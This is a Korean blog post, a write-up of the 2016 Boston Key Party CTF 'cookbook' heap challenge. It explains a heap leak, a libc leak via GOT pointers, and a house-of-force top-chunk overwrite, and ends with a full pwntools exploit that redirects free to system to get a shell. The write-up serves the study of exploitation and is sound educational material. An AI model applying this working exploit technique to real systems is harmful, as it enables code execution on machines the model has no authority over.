---
layout: post
title: "[2016 BKP-ctf] cookbook 풀이"
date: 2018-09-27 04:44
categories: "[Pwn]CTF"
tags: rotles98
---

>### pwn: a top chef wrote this cookbook for me but i think he has an extra secret recipe!
### `cookbook.bostonkey.party 5000`
### [cookbook](https://github.com/ctfs/write-ups-2016/raw/master/boston-key-party-2016/pwn/cookbook-6/58056c425dc617b65f94a8b558a4699fedf4a9fb.tgz)

`house_of_force`

- - -
# 0x00. 분석

{: refdef: style="text-align: center;"}
![checksec](/img/2016_BKP-ctf/cookbook/01.png)
{: refdef}

`32bit`인 `heap` 문제는 처음 풀어봐요.

이 문젠 `main_menu`, `ingredient_menu`, `recipe_menu` 크게 세 가지가 있고 그 안에도 함수가 여러개 있어서 제가 필요한 함수만 설명할 거에요.

우선 바이너리를 실행하면 `calloc(0x40)`에 이름을 입력하라해요. 이런건 나중에 `free`해주니까 `free_hook`를 `system`으로 덮으면 `system(name)`을 실행시킬 수 있어요. 저는 이걸 이용해서 `system("/bin/sh\0")`를 실행시켰어요.

## main_menu

`[g]ive your cookbook a name!`

1. 길이 입력 (16진수)

2. 그 길이만큼 `malloc`해서 **bss**의 `cookbook_name`에 저장

3. `fgets`로 입력<br /><br />

`[R]emove cookbook name`

1. `free(cookbook_name)`<br /><br /><br />

## ingredient_menu

`[n]ew ingredient?`

1. `malloc(0x90)`해서 **bss**의 `my_ingredient`에 저장

2. `해당 chunk + 0x8c`에 자기 자신의 주소를 저장<br /><br />

`[d]iscard current ingredient?`

1. `free(my_ingredient)`

2. **bss**의 `my_ingredient` 초기화<br /><br /><br />

## recipe_menu

`[n]ew recipe`

1. `calloc(0x40c)`해서 **bss**의 `my_recipe`에 저장<br /><br />

`[d]iscard recipe`

1. `free(my_recipe)`

2. **bss**영역은 초기화 안함<br /><br />

`[p]rint current recipe`

1. **bss**의 `my_recipe`가 존재하는지 확인

2. 존재하면 `print_recipe`함수로 `recipe`를 출력<br /><br />

`[i]nclude instructions`

1. **bss**의 `my_recipe`가 존재하는지 확인

2. 존재하면 `fgets(my_recipe -> recipe_info, 0x40c, stdin)`으로 입력받음 **!!bof!!**<br /><br /><br />

`house_of_force`는 `TOP_chunk`의 값을 바꿔야하는데 그건 `recipe_menu - [i]nclude instructions`로 쉽게 할 수 있어요.

그럼 `heap_leak`, `libc_leak`만 하면 쉽게 풀 수 있어요.

- - -
# 0x01. leak

## heap_leak

이건 엄청 쉬운게 `recipe_menu - [d]iscard recipe`를 보면 **bss**의 `my_recipe`를 초기화 안해요.

그래서 새로운 `recipe`하나 만들고 `TOP_chunk`랑 떨어지게 다른 `chunk`하나 할당받고 `recipe`를 `free`해준 다음에 그걸 출력해주면 `cal`을 출력하는 부분에서 `heap_leak`을 할 수 있어요.

```python
# heap_leak
func_recipe("n")
func_ingredient("n")
func_recipe("d")

s.recvuntil("[q]uit\n")
s.sendline("c")
s.recvuntil("[q]uit\n")
s.sendline("p")
s.recvuntil("(null)\n\n")
heap_leak = int(s.recvuntil(" "), 10)

TOP_chunk = heap_leak - 0x94

print
log.info("TOP_chunk : " + hex(TOP_chunk))

s.recvuntil("[q]uit\n")
s.sendline("q")
```

## libc_leak

이건 처음에 고민 좀 했는데 왜냐하면 `recipe_menu - [n]ew recipe`는 `calloc`을 사용해서 **uaf**같은걸 사용할 수 없었어요.

그러다 `main_menu - [g]ive your cookbook a name!`을 찾았어요.

`leak`하는 방법은 `free`된 `my_recipe`랑 같은 크기로 할당받아서 같은 곳에 `chunk`를 할당받고 `recipe`의 `ingredient_list`, `ingredient_cal_list` 대신 `특정 함수의 got` 같은걸 넣어서 `heap_leak`처럼 출력하면 `libc_leak`을 할 수 있어요.

```python
# libc_leak
s.recvuntil("[q]uit\n")
s.sendline("g")

s.recvuntil("how long is the name of your cookbook? (hex because you're both a chef and a hacker!) :")
s.sendline("40c")

payload = p32(calloc_got) * 2
s.sendline(payload)

s.recvuntil("[q]uit\n")
s.sendline("c")
s.recvuntil("[q]uit\n")
s.sendline("p")
s.recvuntil("(null)\n\n")
libc_calloc = 0x100000000 + int(s.recvuntil(" "), 10)

libc_base = libc_calloc - calloc_off
libc_system = libc_base + system_off

log.info("libc_base : " + hex(libc_base))
log.info("libc_calloc : " + hex(libc_calloc))
log.info("libc_system : " + hex(libc_system))
print

s.recvuntil("[q]uit\n")
s.sendline("q")
```

- - -
# 0x02. 공격 방법

1. 이름으로 `/bin/sh\0` 입력

2. `heap_leak`

3. `libc_leak`

4. `overwrite_TOP_chunk`

5. `free_got`, `TOP_chunk` 등의 주소를 가지고 계산한 값으로 `malloc`

6. `free_got`를 `system`으로 덮음

7. `main_menu`를 종료하면 `free("/bin/sh\0")` 실행

- - -
# 0x03. 익스플로잇

```python
from pwn import *
#context.log_level = "debug"

HOST = "192.168.0.19"
#HOST = "cookbook.bostonkey.party"
PORT = 4444
#PORT = 5000

s = remote(HOST, PORT)
pause()

elf = ELF("./cookbook")
libc = ELF("./libc-2.23.so")

puts_plt = elf.plt["puts"]
free_got = elf.got["free"]
calloc_got = elf.got["calloc"]

calloc_off = libc.symbols["calloc"]
system_off = libc.symbols["system"]

def func_ingredient(func):
    s.recvuntil("[q]uit\n")
    s.sendline("a")

    s.recvuntil("[e]xport saving changes (doesn't quit)?\n")
    s.sendline(func)

    s.recvuntil("[e]xport saving changes (doesn't quit)?\n")
    s.sendline("q")

def func_recipe(func):
    s.recvuntil("[q]uit\n")
    s.sendline("c")

    s.recvuntil("[q]uit\n")
    s.sendline(func)

    s.recvuntil("[q]uit\n")
    s.sendline("q")

s.recvuntil("what's your name?\n")
s.sendline("/bin/sh\0") # name

func_recipe("n")
func_ingredient("n")
func_recipe("d")

# heap_leak
s.recvuntil("[q]uit\n")
s.sendline("c")
s.recvuntil("[q]uit\n")
s.sendline("p")
s.recvuntil("(null)\n\n")
heap_leak = int(s.recvuntil(" "), 10)

TOP_chunk = heap_leak - 0x94

print
log.info("TOP_chunk : " + hex(TOP_chunk))

s.recvuntil("[q]uit\n")
s.sendline("q")

# libc_leak
s.recvuntil("[q]uit\n")
s.sendline("g")

s.recvuntil("how long is the name of your cookbook? (hex because you're both a chef and a hacker!) :")
s.sendline("40c")

payload = p32(calloc_got) * 2
s.sendline(payload)

s.recvuntil("[q]uit\n")
s.sendline("c")
s.recvuntil("[q]uit\n")
s.sendline("p")
s.recvuntil("(null)\n\n")
libc_calloc = 0x100000000 + int(s.recvuntil(" "), 10)

libc_base = libc_calloc - calloc_off
libc_system = libc_base + system_off

log.info("libc_base : " + hex(libc_base))
log.info("libc_calloc : " + hex(libc_calloc))
log.info("libc_system : " + hex(libc_system))
print

s.recvuntil("[q]uit\n")
s.sendline("q")
s.recvuntil("[q]uit\n")
s.sendline("R")

# overwrite_TOP_chunk
func_ingredient("d")
func_recipe("n")

s.recvuntil("[q]uit\n")
s.sendline("c")
s.recvuntil("[q]uit\n")
s.sendline("i")
payload = "A"*0x380
payload += "\xff\xff\xff\xff" # TOP_chunk
s.sendline(payload)
s.sendline("q")

s.recvuntil("[q]uit\n")
s.sendline("g")
s.recvuntil("how long is the name of your cookbook? (hex because you're both a chef and a hacker!) :")
chunk_size = 0x100000000 + (free_got - 0x10 - TOP_chunk) - 0x4
s.sendline(str(hex(chunk_size))[2:])

s.recvuntil("[q]uit\n")
s.sendline("g")
s.recvuntil("how long is the name of your cookbook? (hex because you're both a chef and a hacker!) :")
s.sendline("10")
payload = p32(puts_plt)
payload += "AAAA"
payload += p32(libc_system)
s.sendline(payload)

s.recvuntil("[q]uit\n")
s.sendline("q")

s.interactive()
```

### BKPCTF{hey_my_grill_doesnt_work_here}
